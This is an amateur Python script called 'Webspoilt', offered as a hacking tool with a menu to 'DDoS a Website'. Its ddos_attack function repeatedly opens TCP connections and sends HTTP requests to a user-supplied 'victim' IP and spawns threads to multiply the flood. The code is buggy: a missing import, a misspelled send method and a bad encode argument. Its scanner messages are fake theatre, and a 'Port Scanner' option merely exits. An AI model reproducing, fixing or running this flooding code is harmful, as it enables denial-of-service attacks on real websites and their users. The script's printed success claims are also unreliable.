#author : Sayyed Viquar Ahmed (DeadSHot0x7) 
from tqdm import tqdm 
import time 
import pyfiglet
import os
import socket
import urllib.request
import logging

for i in tqdm (range (101), 
			desc="Loading…", 
			ascii=False, ncols=75): 
	time.sleep(0.01) 
	
print("Complete.") 


os .system("cls")


def ipscanner(ip):
    ip_add=socket.gethostbyname(ip)
    for i in range (10,100,10):
        time.sleep(2)
        print("Loading",i,"%")
    print(" \t [*] Sucessful Connected with the Server........!")
    for  j in range (0,5):
        time.sleep(2)
        print("[*] Now Scanning for the Ip address")
    print ("[*] IP Address Found ........!")
    time .sleep(5)
    for k in range (0,4):
        time .sleep(5)
        print("[*]Decoding")
    print("\t [*] IP ADDRES OF THE WEBSITE : \t ",ip_add)

def ddos_attack(a,j,s,i):
    print("[*]  Started Thread's")
    time.sleep(5)
    print("[*] Initalized Thread")
    time .sleep(5)
    target_ip=a
    port=j 
    ip_address=s
    k=i
    while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
         s.connect((target_ip,port))
         s.sendto(("GET /" + target_ip + "HTTP/1.1\r\n").encode(ascii), (target_ip,port))
         s.sendyo(("Host : " + ip_address + "\r\n\r\n").encode(ascii), (target_ip , port))
         for i in range (k):
            thread=threading.Thread(target=ddos_attack)
            thread.start();

    time.sleep(5)
    print(" DDOS ATTACK SUCEESFULL ON ",target_ip,"Address");
        

        



if __name__ == "__main__":
    while(1):
        try:
            banner=pyfiglet.figlet_format("Webspoilt", font="slant")
            print(banner)
            print("\t Script by DeadShot0x7")
            print("\n")
            print("DeadShot0x7 will not responsible for the loss you have done or made ")
            dec=str(input("y or n"))
            if dec == "y" or dec == "Yes" or dec == "yes":
                logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)
                print("Yes I'm Responsible for the loss I've made.")
            else :
                time.sleep(1)
                break
            print("\n")
            print("1.Scann Ip Address     2.DDoS a Website")
            print("3.Brtueforce           4.Port Scanner")
            print("5.Update               6.Exit")
            ans=int(input("Select your option\t"))
            if ans == 1:
                sitename=str(input("Enter The Website name \t"))
                time.sleep(5)
                ipscanner(sitename)        
            if ans == 2:
                target_ip=str(input("Enter Victim's Ip address "));
                port=int(input("Enter the Port number Defualt Port Number ( 3333) "));
                ip_address=str(input("Enter your Ip address "));
                bot=str(input("Enter Number Thread you want to send"));
                ddos_attack(target_ip,port,ip_address,bot);
            if ans == 3 :
                print("\n \n ")
                print("\t This Feature is comming Soons")
                print("\n \n")
                
            if ans == 4 :
                print("CLosing the application ")
                break
            if ans ==5:
                try:
                    os.system("git pull")
                except Exception as e :
                    print("Can't update the script please check your internet Connection")
            if ans == 6:
                time.sleep("1")
                break 

        except :
            print("Cant Open th appliaction Due to some Error")
            